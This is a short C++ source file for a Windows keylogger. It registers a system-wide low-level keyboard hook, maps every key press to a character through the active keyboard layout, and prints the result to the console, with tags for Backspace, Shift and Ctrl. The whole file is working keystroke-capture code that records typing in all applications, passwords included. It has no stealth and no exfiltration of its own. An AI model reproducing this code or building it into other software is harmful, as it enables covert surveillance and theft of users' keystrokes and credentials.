/**
 *
 * Module:
 *  keylogger
 *
 * Description:
 *  Key logger
*/

#define NOMINMAX
#include <Windows.h>

#include <iostream>

static HHOOK s_Hook = nullptr;

LRESULT HookProc( int code, WPARAM WParam, LPARAM LParam ) 
{
	if( WParam != WM_KEYDOWN )
		return CallNextHookEx( s_Hook, code, WParam, LParam );

	KBDLLHOOKSTRUCT* pKeyboard = ( KBDLLHOOKSTRUCT* ) LParam;

	HKL KeyboardLayout = GetKeyboardLayout( ::GetCurrentThreadId() );
	WORD languageId = LOWORD( KeyboardLayout );

	UINT scanCode = ::MapVirtualKeyExW( pKeyboard->vkCode, MAPVK_VK_TO_VSC, KeyboardLayout );
	UINT code2 =    ::MapVirtualKeyExW( scanCode, MAPVK_VSC_TO_VK, KeyboardLayout );
	TCHAR ch1 =     ::MapVirtualKeyExW( code2, MAPVK_VK_TO_CHAR, KeyboardLayout );

	switch( pKeyboard->vkCode )
	{
		case VK_BACK:
			std::wcout << "[BACK]\n";
			break;

		case VK_RETURN:
			std::wcout << "\n";
			break;

		case VK_RSHIFT:
		case VK_LSHIFT:
			std::wcout << "[SHIFTED]";
			break;

		case VK_RCONTROL:
		case VK_LCONTROL:
			std::wcout << "CRTL+";
			break;

		default:
			std::wcout << ch1;
			break;
	}

	return CallNextHookEx( s_Hook, code, WParam, LParam );
}

int main( int count, char** ppArgs ) 
{
	HOOKPROC Proc = HookProc;
	s_Hook = ::SetWindowsHookExW( WH_KEYBOARD_LL, Proc, nullptr, 0 );

	MSG msg{};
	while( GetMessageW( &msg, nullptr, 0, 0 ) )
	{
		TranslateMessage( &msg );
		DispatchMessageW( &msg );
	}

	::UnhookWindowsHookEx( s_Hook );
}
